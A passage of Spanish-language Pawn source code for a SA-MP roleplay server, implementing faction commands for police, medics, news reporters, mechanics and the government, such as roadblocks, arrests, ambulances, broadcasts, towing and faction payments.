			restriccion2 = CreateDynamicObject(16439,1408.50000000,-1733.19995117,14.19999981,0.00000000,0.00000000,88.00000000); //object(cn2_roadblock04) (2)
			restriccion3 = CreateDynamicObject(16439,1422.69995117,-1592.80004883,14.19999981,0.00000000,0.00000000,87.99499512); //object(cn2_roadblock04) (3)
			restriccion4 = CreateDynamicObject(16439,1533.00000000,-1592.50000000,14.19999981,0.00000000,0.00000000,267.99499512); //object(cn2_roadblock04) (5)
			restriccion5 = CreateDynamicObject(1422,1404.90002441,-1742.00000000,13.00000000,0.00000000,0.00000000,86.00000000); //object(dyn_roadbarrier_5) (1)
			restriccion6 = CreateDynamicObject(1422,1406.19995117,-1724.09997559,13.00000000,0.00000000,0.00000000,85.99548340); //object(dyn_roadbarrier_5) (2)
			restriccion7 = CreateDynamicObject(1422,1544.00000000,-1723.80004883,13.00000000,0.00000000,0.00000000,266.00000000); //object(dyn_roadbarrier_5) (3)
			restriccion8 = CreateDynamicObject(1422,1544.09997559,-1720.69995117,13.00000000,0.00000000,0.00000000,269.99548340); //object(dyn_roadbarrier_5) (4)
			restriccion9 = CreateDynamicObject(1422,1544.19995117,-1717.50000000,13.00000000,0.00000000,0.00000000,271.99548340); //object(dyn_roadbarrier_5) (5)
			Mensaje(playerid,C_INFO,"El ayuntamiento ha sido restringido por su orden.");
			AyuntaRestringido = true;
			AnuncioGobernamental("• El ayuntamiento se verá cerrado.");
			MensajeTodos(C_GOBIERNO,"Durante estos momentos, no habra actuvidad social en el centro de la ciudad.");
			MensajeTodos(C_GOBIERNO,"Para evitar conflictos evite pasar por estas zonas, en éste momento.");
			MensajeTodos(C_GOBIERNO," ");
			MensajeTodos(C_GOBIERNO,""#CBLANCO"Att: "#CAZULCLARO"La policia de la ciudad.");
			return 1;
		}
		return Error(playerid,"Debes ser lider de la policia o de los militares para utilizar éste comando");
	}

	CMD:abrirayuntamiento(playerid,params[])
	{
		if(InfoJugador[playerid][jLider] == 1 || InfoJugador[playerid][jLider] == 2)
		{
			if(!AyuntaRestringido) return Mensaje(playerid,C_INFO,"¡El ayuntamiento no está restringido!"),1;
			DestroyDynamicObject(restriccion1);
			DestroyDynamicObject(restriccion2);
			DestroyDynamicObject(restriccion3);
			DestroyDynamicObject(restriccion4);
			DestroyDynamicObject(restriccion5);
			DestroyDynamicObject(restriccion6);
			DestroyDynamicObject(restriccion7);
			DestroyDynamicObject(restriccion8);
			DestroyDynamicObject(restriccion9);
			Mensaje(playerid,C_INFO,"Ahora se puede volver a circular por el ayuntamiento.");
			AyuntaRestringido = false;
			AnuncioGobernamental("• El ayuntamiento está abierto nuevamente.");
			MensajeTodos(C_GOBIERNO,"Ahora, se puede transitar por el centro de Los Santos sin molestia alguna.");
			return 1;
		}
		return Error(playerid,"Debes ser lider de la policia o de los militares para utilizar éste comando");
	}

	CMD:megafono(playerid,params[])
	{
		if(!EsLSPD(playerid) && !EsMilitar(playerid) && !EsMedico(playerid)) return Error(playerid,"¡No eres policia/militar/médico!"),1;
		if(isnull(params)) return ParamsINC(playerid,"/m [ Texto ]");
		new String[128];
		format(String,sizeof(String),"%s ( Megáfono ) : %s",NombreJugador(playerid),params[0]);
		ProxDetector(80,playerid,String,C_AZULCLARO,C_AZULCLARO,C_AZULCLARO,C_AZULCLARO,C_AZULCLARO);
		return 1;
	}

	CMD:arrestar(playerid,params[])
	{
		if(!EsLSPD(playerid) && !EsMilitar(playerid)) return Error(playerid,"¡No eres policia/militar!"),1;
	    if(!IsPlayerInRangeOfPoint(playerid,2,2527.2073,-1294.1211,1031.4219)) return Error(playerid,"No estás en la puerta de las celdas!");
	    if(sscanf(params,"ui",params[0],params[1])) return ParamsINC(playerid,"/arrestar [ ID ] [ Minutos ]");
	    if(params[1] < 1 || params[1] > 150) return Error(playerid,"Minimo 1 minuto, y máximo 150 minutos!");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
	    if(!ProxDetectorS(4,playerid,params[0])) return Error(playerid,"Muy lejor de ese jugador!");
		MandarCarcel(params[0],params[1]);
		new Rol[126],MSG[100];
		GameTextForPlayer(params[0],"~r~^Arrestado!",5000,3);
		ResetPlayerWeapons(params[0]);
		format(Rol,sizeof(Rol),"arresta a %s por %d meses (( Minutos ))",NombreJugador(params[0]),params[1]);
		AutoRol(playerid,Rol);
		format(MSG,sizeof(MSG),"Fuiste arrestado por el oficial "#CAZUL"%s "#CBLANCO"por %d minutos",NombreJugador(playerid),params[1]);
		Mensaje(params[0],-1,MSG);
	    return 1;
	}

	// ----========[ COMANDOS LSMD ]======-------- //

	CMD:placa(playerid, params[])
	{
		if(!EsLSPD(playerid) && !EsMedico(playerid) && !EsMilitar(playerid)) return Error(playerid,"¡No eres policia, médico, ni militar!"),1;
	    if(sscanf(params,"u",params[0],params[1])) return ParamsINC(playerid,"/placa [ID/Nombre]");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
	    if(!ProxDetectorS(4,playerid,params[0])) return Error(playerid,"Muy lejos de ese jugador!");

		new
			PlayerText:Licencia_Fac,
			PlayerText:Licencia_Fac2;

		Licencia_Fac = CreatePlayerTextDraw(params[0],294.000000, 260.000000, pName(playerid) );
		PlayerTextDrawBackgroundColor(params[0],Licencia_Fac, 255);
		PlayerTextDrawFont(params[0],Licencia_Fac, 1);
		PlayerTextDrawLetterSize(params[0],Licencia_Fac, 0.500000, 1.000000);
		PlayerTextDrawColor(params[0],Licencia_Fac, -16776961);
		PlayerTextDrawSetOutline(params[0],Licencia_Fac, 1);
		PlayerTextDrawSetProportional(params[0],Licencia_Fac, 1);
		PlayerTextDrawUseBox(params[0],Licencia_Fac, 1);
		PlayerTextDrawBoxColor(params[0],Licencia_Fac, 1347440720);
		PlayerTextDrawTextSize(params[0],Licencia_Fac, 384.000000, 0.000000);
		PlayerTextDrawSetSelectable(params[0],Licencia_Fac, 0);

		Licencia_Fac2 = CreatePlayerTextDraw(params[0],297.000000, 202.000000, "Policia Nacional");
		PlayerTextDrawBackgroundColor(params[0],Licencia_Fac2, 255);
		PlayerTextDrawFont(params[0],Licencia_Fac2, 1);
		PlayerTextDrawLetterSize(params[0],Licencia_Fac2, 0.310000, 2.600000);
		PlayerTextDrawColor(params[0],Licencia_Fac2, 65535);
		PlayerTextDrawSetOutline(params[0],Licencia_Fac2, 1);
		PlayerTextDrawSetProportional(params[0],Licencia_Fac2, 1);
		PlayerTextDrawSetSelectable(params[0],Licencia_Fac2, 0);

		if(EsMedico(playerid))
		{
		    PlayerTextDrawSetString(playerid, Licencia_Fac2, "~p~~h~Hospital de SA");
		}
		else if(EsMilitar(playerid))
		{
		    PlayerTextDrawSetString(playerid, Licencia_Fac2, "~g~Ejercito de SA");
		}
		PlayerTextDrawShow(params[0], Licencia_Fac);
		PlayerTextDrawShow(params[0], Licencia_Fac2);
		TextDrawShowForPlayer(params[0], Fondo_Licencia);

		SetTimerEx("_2PlayerTextDrawDestroy", 5000, false, "ii", params[0], _:Licencia_Fac);
		SetTimerEx("_2PlayerTextDrawDestroy", 5000, false, "ii", params[0], _:Licencia_Fac2);
		SetTimerEx("_2TextDrawHideForPlayer", 5000, false, "ii", params[0], _:Fondo_Licencia);

		new Str[60];
		A_Format(Str,"le muestra su placa a %s", NombreJugador(params[0]) );

		AutoRol(playerid, Str);
		return 1;
	}

CALLBACK: _2PlayerTextDrawDestroy(playerid, PlayerText:id)
	return PlayerTextDrawDestroy(playerid, id);

CALLBACK: _2TextDrawHideForPlayer(playerid, Text:id)
	return TextDrawHideForPlayer(playerid, id);


/*	CMD:curar(playerid,params[])
	{
		if(!EsMedico(playerid)) return Error(playerid,"¡No eres médico!");
	    if(sscanf(params,"ui",params[0],params[1])) return ParamsINC(playerid,"/curar [ID/NOMBRE] [CANTIDAD]");
	    if(params[1] > GetPVarInt(playerid,"CantidadSangre")) return Error(playerid,"¡No tienes esa cantidad de sangre!");
		if(params[1] < 1) return Error(playerid,"¡Debe ser un número positivo!");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"Jugador desconectado");
		if(!ProxDetectorS(2,playerid,params[0])) return Error(playerid,"¡Ese jugador está demasiado lejos tuyo!");
		SetPVarInt(playerid,"CantidadSangre",GetPVarInt(playerid,"CantidadSangre")-params[1]);
		GetPlayerPos(params[0],PosJugador[X],PosJugador[Y],PosJugador[Z]);
		SetPlayerPos(playerid,PosJugador[X]+0.5,PosJugador[Y],PosJugador[Z]);
		new Float:Angulo;
		GetPlayerFacingAngle(params[0],Angulo);
		SetPlayerFacingAngle(playerid,Angulo+270);
		ApplyAnimation(params[0], "CRACK", "crckdeth2", 4.0, 0, 0, 0, 1, 0,true);
		ApplyAnimation(playerid,"MEDIC","CPR",4.5,0, 0, 0, 1, 0,true);
		GetPlayerHealth(params[0],InfoJugador[params[0]][jVida]);
		SetPlayerHealth(params[0],InfoJugador[params[0]][jVida]+params[1]);
		SetTimerEx("cmd_detener",5000,0,"i",params[0]);
		SetTimerEx("cmd_detener",5000,0,"i",playerid);
		return 1;
 	}

 	CMD:sacarsangre(playerid,params[])
 	{
 	    if(!IsPlayerInRangeOfPoint(playerid,1,266.5576,290.7323,984.0469)) return Error(playerid,"¡No estas en el dispositivo!");
		if(!EsMedico(playerid)) return Error(playerid,"¡No eres médico!");
		if(sscanf(params,"i",params[0]))
		{
			new str[48];
			ParamsINC(playerid,"/sacarsangre [CANTIDAD]");
	 		format(str,sizeof(str),"En la máquina hay %d mililitros de sangre",InfoFaccion[IDLSMD][fSangre]);
			Mensaje(playerid,-1,str);
			return 1;
		}
		if(params[0] < 1) return Error(playerid,"¡Introduce un número positivo!");
		if(params[0] > InfoFaccion[IDLSMD][fSangre]) return Error(playerid,"¡No hay esa cantidad de sangre!");
		new rol[55],str[70];
		format(rol,sizeof(rol),"retira de la máquina %d mililitros de sangre",params[0]);
		AutoRol(playerid,rol);
		SetPVarInt(playerid,"CantidadSangre",GetPVarInt(playerid,"CantidadSangre") + params[0]);
		InfoFaccion[IDLSMD][fSangre] -= params[0];
		format(str,sizeof(str),"En la máquina hay %d mililitros de sangre, y tu tienes %d",InfoFaccion[IDLSMD][fSangre],GetPVarInt(playerid,"CantidadSangre"));
		Mensaje(playerid,-1,str);
		return 1;
	}
*/

	CMD:rastrear(playerid,params[])
	{
	    if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/rastrear [ID/NOMBRE]");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
		if(EsMedico(playerid))
		{
	    	if(!GetPVarInt(params[0],"LLAMO_HOSPITAL")) return Error(playerid,"¡El no ha llamado al hospital!");
			SetPlayerMarkerForPlayer(playerid,params[0], C_LSMD);
			SetTimerEx("DesmarcarPos", 120000, false, "iii", params[0], 0, playerid);
			Mensaje(playerid,-1,"Se ha reportado su ubicación "#CLSMD"(el punto rosa)");
			foreach(Player,i) if(EsMedico(i))
			{
				MensajeF(i, -1, "- %s rastreó la ubicación de la llamada.",NombreJugador(playerid));
			}
			MensajeF(params[0],-1,"El médico "#CLSMD"%s"#CBLANCO", rastreo tu ubicación.",NombreJugador(playerid));
			return 1;
		}
		else if(EsLSPD(playerid))
		{
	    	if(!GetPVarInt(params[0],"LLAMO_POLICIA")) return Error(playerid,"¡El no ha llamado a la policia!");
			SetPlayerMarkerForPlayer(playerid,params[0], C_AZUL2);
			SetTimerEx("DesmarcarPos", 120000, false, "iii", params[0], 0, playerid);
			Mensaje(playerid,-1,"Se ha reportado su ubicación "#CAZUL2"(el punto azul)");
			foreach(Player,i) if(EsLSPD(i))
			{
				MensajeF(i, -1, "- %s rastreó la ubicación de la llamada.",NombreJugador(playerid));
			}
			MensajeF(params[0],-1,"El oficial "#CLSPD"%s"#CBLANCO", rastreo tu ubicación.",NombreJugador(playerid));
			return 1;
		}
		else if(EsMecanico(playerid))
		{
	    	if(!GetPVarInt(params[0],"LLAMO_MECANICOS")) return Error(playerid,"¡El no ha llamado un mecánico!");
			SetPlayerMarkerForPlayer(playerid,params[0], C_VIOLETA);
			SetTimerEx("DesmarcarPos", 120000, false, "iii", params[0], 0, playerid);
			Mensaje(playerid,-1,"Se ha reportado su ubicación "#CVIOLETA"(el punto violeta)");
			foreach(Player,i) if(EsMecanico(i))
			{
				MensajeF(i, -1, "- %s rastreó la ubicación de la llamada.",NombreJugador(playerid));
			}
			MensajeF(params[0],-1,"El mecánico "#CVIOLETA"%s"#CBLANCO", rastreo tu ubicación.",NombreJugador(playerid));
			return 1;
		}
		return Error(playerid,"No eres ni policía, ni médico, ni mecánico");
	}

	CMD:aambulancia(playerid, params[])
	{
		if(!EsMedico(playerid)) return Error(playerid, "¡No eres médico!");
	    if(sscanf(params,"u", params[0])) return ParamsINC(playerid, "/aambulancia [ID]");

		new
		    VehID = GetPlayerVehicleID(playerid),
			Rol[40];

	    if(GetVehicleModel(VehID) != 416 || VehID == INVALID_VEHICLE_ID) return Error(playerid,"¡Debes estar en una ambulancia!");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid,"¡Jugador desconectado!");
		if(!ProxDetectorS( 4.0, playerid, params[0])) return Error(playerid,"¡Ese jugador está muy lejos tuyo!");
		if(IsPlayerInAnyVehicle(params[0])) return Error(playerid,"¡No puedes subirlo si el está en un vehículo!");

		Loop(i, sizeof(Camillas), 0)
		{
			if(InfoCamilla[i][camiUsadaPor] == params[0])
			{
				return Error(playerid,"¡No puedes subirlo a el, porque está usando una camilla!");
			}
		}

		PutPlayerInVehicle(params[0], VehID, 2 );

		A_Format(Rol,"sube a %s a la ambulancia", NombreJugador(params[0]) );
		AutoRol(playerid, Rol);

		return 1;
	}

	CMD:salvar(playerid, params[])
	{
		if(!EsMedico(playerid) && !EsLSPD(playerid)) return Error(playerid, "¡No eres médico, ni policía!");
	    if(sscanf(params,"u", params[0])) return ParamsINC(playerid, "/salvar [ID]");

		new
			Rol[60];

		if(params[0] == INVALID_PLAYER_ID) return Error(playerid,"¡Jugador desconectado!");
		if(!ProxDetectorS( 4.0, playerid, params[0])) return Error(playerid,"¡Ese jugador está muy lejos tuyo!");
		if(IsPlayerInAnyVehicle(params[0])) return Error(playerid,"¡No puedes subirlo si el está en un vehículo!");
		if(InfoJugador[params[0]][jMuerto] == false) return Error(playerid,"Ese jugador no está por morir.");

		A_Format(Rol,"le aplica primeros auxilios a %s", NombreJugador(params[0]) );
		AutoRol(playerid, Rol);
		MensajeF(params[0], -1, "¡%s "#CBLANCO"te ha salvado la vida!", NombreJugador(playerid) );
		TextoJugador(params[0], "~g~salvado",5000, 4);
		KillTimer2(params[0], TIMER_VAAMORIR);
		InfoJugador[params[0]][jMuerto] = false;
		return 1;
	}

	CMD:sambulancia(playerid, params[])
	{
		if(!EsMedico(playerid)) return Error(playerid, "¡No eres médico!");
	    if(sscanf(params,"u", params[0])) return ParamsINC(playerid, "/sambulancia [ID]");

		new
			Rol[40];

		if(params[0] == INVALID_PLAYER_ID) return Error(playerid,"¡Jugador desconectado!");
		if(!ProxDetectorS( 2.0, playerid, params[0])) return Error(playerid,"¡Ese jugador está muy lejos tuyo!");
		if(!IsPlayerInAnyVehicle(params[0]) || GetVehicleModel(GetPlayerVehicleID(params[0])) != 416) return Error(playerid,"¡El no está en una ambulancia!");

		RemovePlayerFromVehicle(params[0]);
		A_Format(Rol,"baja a %s de la ambulancia", NombreJugador(params[0]) );
		AutoRol(playerid, Rol);
		return 1;
	}

	CMD:curar(playerid, params[])
	{
	    if(!EsMedico(playerid)) return Error(playerid,"¡No eres médico!");
	    if(!IsPlayerInRangeOfPoint(playerid, 10.0, 2572.9324,1262.2339,866.3764)) return Error(playerid,"¡No estás en el quirofano!");

	    if(sscanf(params,"u", params[0])) return ParamsINC(playerid, "/curar [ID]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid,"¡Jugador desconectado!");
		if(!ProxDetectorS( 2.0, playerid, params[0])) return Error(playerid,"¡Ese jugador está muy lejos tuyo!");

		new
			Float:PlayerHP,
			Rol[30];

		GetPlayerHealth(params[0], PlayerHP);

		if( PlayerHP > 80.0 && InfoJugador[params[0]][jMuerto] == false ) return Error(playerid,"¡Esa persona debe estar en grave estado!");

		InfoJugador[params[0]][jMuerto] = false;

		Bit_Set(AnimsLocked, params[0], false);

		SetPlayerHealth(params[0], 100.0);

		A_Format(Rol,"cura a %s", NombreJugador(params[0])) ;
		AutoRol(playerid, Rol);

		MensajeF(params[0], -1, "El médico "#CLSMD"%s "#CBLANCO"te curó.", NombreJugador(playerid) );
		return true;
	}

	CMD:acamilla(playerid,params[])
	{
		if(!EsMedico(playerid)) return Error(playerid, "¡No eres médico!");

		new
		    bool:success;

		Loop(i, sizeof(Camillas), 0)
		{
			if(InfoCamilla[i][camiUsadaPor] == playerid)
			{
			    success = true;
			    break;
			}
		}

		if(!success) return Error(playerid,"¡No estás usando una camilla!");

		if(sscanf(params, "u", params[0])) return ParamsINC(playerid,"/acamilla [id]");

		if(params[0] == INVALID_PLAYER_ID) return Error(playerid,"¡Jugador desconectado!");
		if(params[0] == playerid) return Error(playerid,"No podes subirte a vos mismo");
		if(!ProxDetectorS( 2.0, playerid, params[0])) return Error(playerid,"¡Ese jugador está muy lejos tuyo!");

		new
		    Float:Pos[3],
			Float:Ang,
			Rol[40];

		GetPlayerFacingAngle(playerid, Ang);
		GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
		GetPosInFrontOfPlayer(playerid, Pos[0], Pos[1], 1.7);

		SetPlayerPos(params[0], Pos[0], Pos[1], Pos[2]+0.5);
		cmd_crack(params[0], "");

		A_Format(Rol,"sube a %s a la camilla", NombreJugador(params[0]) );
		AutoRol(playerid, Rol);
		return 1;
	}

	// --=======[ COMANDOS LSTV ]========-- //

	CMD:iniciar(playerid,params[])
	{
	    if(strcmp(params,"transmision",true) == 0)
	    {
	        if(!EsReportero(playerid)) return Error(playerid,"¡No eres reportero!");
	        if( ( EsVehLSTV(GetPlayerVehicleID(playerid)) && (GetVehicleModel(GetPlayerVehicleID(playerid)) == 582 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 488)) || IsPlayerInRangeOfPoint(playerid,2,1277.1999,-833.29,1045))
	        {
	            if(EnTransmision) return Error(playerid,"¡Ya se inició la transmisión!");
				EnTransmision = true;
				AutoRol(playerid,"agarra un microfono");
				Mensaje(playerid,-1,"Para hablar por el microfono, usa"#CINFO" /mic");
				MensajeTodos(-1," ");
	            MensajeTodos(C_NEGRO,"___________________"#CAZUL2" INICIO DE TRANSMISIÓN - LSTV "#CNEGRO"___________________");
				return 1;
			}
			else return Error(playerid,"¡No estas ni en ninguna camioneta, ni en el estudio!");
		}
	    else if(strcmp(params,"programa",true) == 0)
	    {
	        if(!EsReportero(playerid)) return Error(playerid,"¡No eres reportero!");
            if(EnTransmision_AV) return Error(playerid,"¡Ya se inició la transmisión!");
			if(!IsPlayerInRangeOfPoint(playerid,2,1277.1999,-833.29,1045)) return Error(playerid,"¡debes estar en el estudio para iniciar el programa!");
			EnTransmision_AV = true;
   			MensajeTodos(C_AZUL2,"Noticias LSTV: "#CBLANCO"¡Se inició nuestro programa de televisión!");
			foreach(Player,i)
			{
			    if(GetPVarInt(i,"VIENDO_TV"))
				{
				    TextDrawHideForPlayer(i, TV_Azul);
				}
			}
			return 1;
		}
		return ParamsINC(playerid,"/iniciar <transmision/programa>");
	}

	CMD:mic(playerid,params[])
	{
		if(EsIP(params))
		{
			MensajeAdminF(C_ROJO, "[Anti-SPAM] "#CBLANCO"%s(%d): "#CINFO"/mic %s", Destacado, NombreJugador_(playerid), playerid, params);
			_Kick(playerid,T_ANTICHEAT,"SPAM");
			return 0;
		}
	    if(sscanf(params,"s[120]",params[0])) return ParamsINC(playerid,"/mic [TEXTO]");
     	if(!EsReportero(playerid) && !GetPVarInt(playerid,"Entrevistado_Por")) return Error(playerid,"¡No eres reportero!");
      	if(!EnTransmision) return Error(playerid,"¡Aún no se inició la transmisión! "#CINFO"(/iniciar transmicion)");
       	if( ( EsVehLSTV(GetPlayerVehicleID(playerid)) && (GetVehicleModel(GetPlayerVehicleID(playerid)) == 582 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 488)) || IsPlayerInRangeOfPoint(playerid,2,1277.1999,-833.29,1045))
       	{
			new Str[160];
			if(EsReportero(playerid))
			{
				A_Format(Str,"(Noticias LSTV) Locutor %s: "#CBLANCO"%s",NombreJugador(playerid),params);
			}
			else A_Format(Str,"(Noticias LSTV) Entrevistado %s: "#CBLANCO"%s",NombreJugador(playerid),params);
			MensajeRadio(C_AZUL2, Str, RADIO_LSTV);
   			ProxDetector(60.0,playerid,Str,-1,Hablar,Hablar2,Hablar3,Hablar4);
			return 1;
		}
		return Error(playerid,"¡Aquí no hay un micrófono!");
	}

	CMD:finalizar(playerid,params[])
	{
	    if(strcmp(params,"transmision",true) == 0)
	    {
	        if( ( EsVehLSTV(GetPlayerVehicleID(playerid)) && (GetVehicleModel(GetPlayerVehicleID(playerid)) == 582 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 488)) || IsPlayerInRangeOfPoint(playerid,2,1277.1999,-833.29,1045))
	        {
	        	if(!EsReportero(playerid)) return Error(playerid, "¡No eres reportero!");
	            if(!EnTransmision) return Error(playerid,"¡No se inició la transmisión!");
	            MensajeRadio(C_NEGRO, "___________________"#CAZUL2" CIERRE DE TRANSMISIÓN - LSTV "#CNEGRO"___________________", RADIO_LSTV);
				EnTransmision = false;
				return 1;
			}
			else return Error(playerid,"¡No estas ni en ninguna camioneta, ni en el estudio!");
		}
	    else if(strcmp(params,"programa",true) == 0)
	    {
	        if(!EsReportero(playerid)) return Error(playerid, "¡No eres reportero!");
			if(!EnTransmision_AV) return Error(playerid, "¡No se inició un programa!");
			foreach(Player, i)
			{
			    if(GetPVarInt(i, "TV_CANAL") == CANAL_LSTV)
			    {
			        GameTextForPlayer(i, "~w~el programa ~r~finalizo", 4000, 3);
			        TextDrawShowForPlayer(i, TV_Azul);
				}
			}
			EnTransmision_AV = false;
   			MensajeTodos(C_AZUL2,"Noticias LSTV: "#CBLANCO"Finalizó nuestro programa de televisión.");
			return 1;
		}
		return ParamsINC(playerid,"/finalizar <transmision/programa>");
	}

	CMD:entrevistar(playerid,params[])
	{
		if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/entrevistar [ID/NOMBRE]");
  		if(!EsReportero(playerid)) return Error(playerid,"¡No eres reportero!");
  		if(EsReportero(params[0])) return Error(playerid,"¡No puedes entrevistar a un reportero!");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
		if(!ProxDetectorS(3,playerid,params[0])) return Error(playerid,"¡Ese jugador está muy lejos tuyo!");
		SetPVarInt(params[0],"Entrevistado_Por",playerid);
		new Str[100];
		A_Format(Str,"El reportero %s te ofrece una entrevista para la radio\n\n\t¿La aceptas?",NombreJugador_(playerid));
		Dialog(params[0],dAEntrevista,DIALOG_STYLE_MSGBOX,""#CBLANCO"Aceptar entrevista",Str,"Si","No");
		Mensaje(playerid,-1,"Le ofreciste una entrevista, espera la respuesta de el");
		return 1;
	}

	CMD:ponermusica(playerid,params[])
	{
		if(sscanf(params,"s[120]",params[0])) return ParamsINC(playerid,"/ponermusica [LINK]");
  		if(!EsReportero(playerid) && !EsPresidente(playerid)) return Error(playerid,"¡No eres reportero, ni presidente!");
    	if(!EnTransmision) return Error(playerid,"¡No se inició la transmisión!");
     	if( ( EsVehLSTV(GetPlayerVehicleID(playerid)) && (GetVehicleModel(GetPlayerVehicleID(playerid)) == 582 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 488)) || IsPlayerInRangeOfPoint(playerid,2,1277.1999,-833.29,1045))
      	{
			foreach(Player, i)
			{
			    if(IsPlayerInAnyVehicle(i))
			    {
			        if(Veh[GetPlayerVehicleID(i)][vRadio] == RADIO_LSTV)
			        {
			            PlayAudioStreamForPlayer(i, params);
					}
				}
			}
			alm(RadioLSTV, params);
			return 1;
		}
		else return Error(playerid,"¡No estas ni en ninguna camioneta, ni en el estudio!");
	}


	// --=======[ COMANDOS MECÁNICOS ]========-- //

	CMD:repararmotor(playerid,params[])
	{
		if(!EsMecanico(playerid)) return Error(playerid,"¡No eres mecánico!");
	    Comando_En_Auto
	    if((GetTickCount() - GetPVarInt(playerid,"_REPARARMOTOR")) < 30000) return Error(playerid,"¡Solo puedes reparar un coche cada 30 segundos!");
	    new Float:VidaVeh,VehID = GetPlayerVehicleID(playerid);
	    GetVehicleHealth(VehID,VidaVeh);
	    if(VidaVeh + 450.0 > 1000.0) VidaVeh = 1000.0;
	    else VidaVeh += 450.0;
	    SetVehicleHealth(VehID,VidaVeh);
	    SetPVarInt(playerid,"_REPARARMOTOR",GetTickCount());
	    AutoRol(playerid,"repara un vehículo");
	    return 1;
	}

	CMD:deposito(playerid,params[])
	{
	    if(!EsMecanico(playerid)) return Error(playerid,"¡No eres mecánico!");
	    Comando_En_Auto
	    if(!IsPlayerInRangeOfPoint(playerid,200,1785.2458,-2041.0432,13.5328)) return Error(playerid,"¡No estás en el taller!");
		new VehID = GetPlayerVehicleID(playerid);
		GetPlayerPos(playerid,InfoVeh[VehVenta_ID(VehID)][vPosX],InfoVeh[VehVenta_ID(VehID)][vPosY],InfoVeh[VehVenta_ID(VehID)][vPosZ]);
		GetPlayerFacingAngle(playerid,InfoVeh[VehVenta_ID(VehID)][vPosA]);
		ActualizarVehiculo(VehVenta_ID(VehID));
		TextoJugador(playerid,"~w~vehiculo estacionado en el deposito",5000,3);
		return 1;
	}

	CMD:modificar(playerid,params[])
	{
		if(!EsMecanico(playerid)) return Error(playerid,"¡No eres mecánico!");
		if(!IsPlayerInRangeOfPoint(playerid,30,1785.2458,-2041.0432,13.5328)) return Error(playerid,"¡Solo puedes hacer esto en el taller!");
		Comando_En_Auto
  		Dialog(playerid,dMMecanicos_0,DIALOG_STYLE_LIST,"Menú - vehículo","> Pintura\n> Componentes\n> Reparar","Aceptar","Cancelar");
		return 1;
	}

	CMD:remolcar(playerid,params[])
	{
	    if(!EsMecanico(playerid) && !EsLSPD(playerid)) return Error(playerid,"¡No eres mecánico, ni policía!");
	    Comando_En_Auto
	    new
			VehID = GetPlayerVehicleID(playerid),
			Modelo = GetVehicleModel(VehID);

		if(Modelo != 525 && Modelo != 515 && Modelo != 514 && Modelo != 403) return Error(playerid,"¡No puedes remolcar en este vehículo!");
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return Error(playerid,"¡No eres el conductor!");
		new VehC = VehCercaMio(playerid);
		if(VehC == -1) return Error(playerid,"No se encontro ningún vehículo para remolcar");
		if ( GetVehicleModel(GetPlayerVehicleID(playerid)) == 515 && GetVehicleModel(VehC) != 591 &&
	 		 GetVehicleModel(GetPlayerVehicleID(playerid)) == 515 && GetVehicleModel(VehC) != 435 &&
			 GetVehicleModel(GetPlayerVehicleID(playerid)) == 515 && GetVehicleModel(VehC) != 584 ||
			 GetVehicleModel(GetPlayerVehicleID(playerid)) == 514 && GetVehicleModel(VehC) != 591 &&
			 GetVehicleModel(GetPlayerVehicleID(playerid)) == 514 && GetVehicleModel(VehC) != 435 &&
			 GetVehicleModel(GetPlayerVehicleID(playerid)) == 514 && GetVehicleModel(VehC) != 584 ||
			 GetVehicleModel(GetPlayerVehicleID(playerid)) == 403 && GetVehicleModel(VehC) != 591 &&
			 GetVehicleModel(GetPlayerVehicleID(playerid)) == 403 && GetVehicleModel(VehC) != 435 &&
			 GetVehicleModel(GetPlayerVehicleID(playerid)) == 403 && GetVehicleModel(VehC) != 584  ) return 1;

	    if(!IsPlayerInRangeOfPoint(playerid,100,1785.2458,-2041.0432,13.5328))
	    {
	        new i = VehVenta_ID(VehC);
	        if(i)
	        {
			    if(IsVehicleInRangeOfPoint(VehC,30,InfoVeh[i][vPosX],InfoVeh[i][vPosY],InfoVeh[i][vPosZ]))
			    {
			        return Error(playerid,"¡No puedes retirar este vehículo de aquí, está en su punto de spawn!");
				}
			}
		}
		if(!GetVehicleTrailer(GetPlayerVehicleID(playerid)) )
		{
  			AttachTrailerToVehicle(VehC, GetPlayerVehicleID(playerid));
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 515 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 514 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 403 )
			{
				AutoRol(playerid, "remolca un camión");
			}
			else AutoRol(playerid,"remolca un vehículo");
		}
		else
		{
			DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
   			if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 515 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 514 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 403 )
		    {
				AutoRol(playerid,"desengancha un camión");
			}
			else AutoRol(playerid,"desengancha un vehículo");
		}
		return 1;
	}

	// --=======[ COMANDOS GOBIERNO ]========-- //

	CMD:pagarfaccion(playerid,params[])
	{
	    if(sscanf(params,"is[20]",params[0],params[1])) return ParamsINC(playerid,"/pagarfaccion [DINERO] <POLICIA - EJERCITO - HOSPITAL - TELEVISION - MECÁNICOS>");
	    if(!EsPresidente(playerid)) return Error(playerid,"¡No eres el presidente!");
		if(params[0] > InfoFaccion[IDGOBIERNO][fDinero] || params[0] < 1) return Error(playerid,"¡No tienes ese dinero en la caja fuerte!");
		if(!strcmp(params[1],"Policia",true))
		{
		    InfoFaccion[IDLSPD][fDinero] += params[0];
		    InfoFaccion[IDGOBIERNO][fDinero] -= params[0];
		    new Str[120];
		    A_Format(Str,""#CAZUL2"[ATENCIÓN] > "#CBLANCO"El gobierno (Presidente: %s) pagó a la policia "#CINFO"$%d.",NombreJugador_(playerid),params[0]);
		    MensajeTodos(-1,Str);
